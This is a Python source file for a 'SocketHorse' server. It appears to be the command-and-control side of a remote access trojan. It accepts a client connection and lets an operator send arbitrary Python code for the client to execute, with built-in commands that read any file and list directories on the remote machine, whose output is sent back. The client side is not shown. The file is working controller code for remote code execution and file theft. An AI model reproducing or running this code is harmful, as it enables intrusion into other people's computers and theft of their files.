import socket
import datetime
import chardet
import sys
import json

def detect_encoding(file_path):
    with open(file_path, 'rb') as f:
        rawdata = f.read()
    result = chardet.detect(rawdata)
    encoding = result['encoding']
    return encoding

def t():
    current_time = datetime.datetime.now()
    return current_time.strftime("%Y %m %d %H:%M:%S")

def send_g(a):
    return f"SocketHorse:\nversion:1.0.0\nSQL:False\nanswer:run_OK 500\nError_answer:Error 400\nserver:OK 500\nanswer_bol:True\nwindows:False\nbody:\n{a}"

def start_server(host='192.168.10.21', port=8081):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host, port))
        s.listen()
        print(f"{t()}      Server listening on {host}:{port}")
        while True:
            conn, addr = s.accept()
            with conn:
                print(f"{t()}      Connection from {addr}")
                while True:
                    data = conn.recv(1024)
                    if not data:
                        break
                    print(f"{t()}      Received: {data.decode('utf-8')}")
                    # Send a response back to the client
                    response = "running? answer:Y"
                    conn.sendall(response.encode('utf-8'))
                    data = conn.recv(1024)
                    if not data:
                        break
                    client_answer = data.decode('utf-8')
                    print(f"      client answer: {client_answer}")
                    while True:
                        a = input("i>")
                        z = "global send_return\n"
                        if a.startswith("run "):
                            a = a[4:]
                            if a.startswith("read "):
                                a = a[5:].replace(" ", "").replace("\\", "/").replace("'", "'")
                                z += f'send_return = open("{a}", encoding = "{detect_encoding(a)}").read()'
                            elif a.startswith("tree "):
                                a = a[5:].replace(" ", "").replace("\\", "/")
                                b = "{}"
                                z = z + f"""
import os
import io
global send_return_2
global print_tree
def print_tree(startpath, depth, current_depth=0):
    if current_depth > depth:
        return
    for root, dirs, files in os.walk(startpath):
        level = root.replace(startpath, '').count(os.sep)
        if level > depth:
            continue
        indent = ' ' * 4 * (level)
        send_return_2.write('{b}{b}/\\n'.format(indent, os.path.basename(root)))
        subindent = ' ' * 4 * (level + 1)
        for f in files:
            send_return_2.write('{b}{b}\\n'.format(subindent, f))
        if current_depth < depth:
            for d in dirs:
                print_tree(os.path.join(root, d), depth, current_depth + 1)
        break  # Only process the first level of directories at each recursion level
startpath = "{a}"
depth = 1
send_return_2 = io.StringIO()
print_tree(startpath, depth)
send_return = send_return_2.getvalue()
send_return_2.close()
"""
                            else:
                                z = z + a.replace('"', "'")

                        elif a.startswith("end"):
                            input("退出……")
                            sys.exit()
                        response = send_g(a=z)
                        print(response)
                        print(f"{t()}      Sending to client\n\n\nreturn:")
                        conn.sendall(response.encode('utf-8'))
                        data = conn.recv(8192)
                        if not data:
                            break
                        print(data.decode("utf-8"))

if __name__ == "__main__":
    with open("ins.txt") as file:
        a = file.read()
    dict_str = a.split('=')[1].strip()
    dict_str = dict_str.replace("'", '"')
    ins_dict = json.loads(dict_str)
    start_server(ins_dict.get("ip"), ins_dict.get("port"))
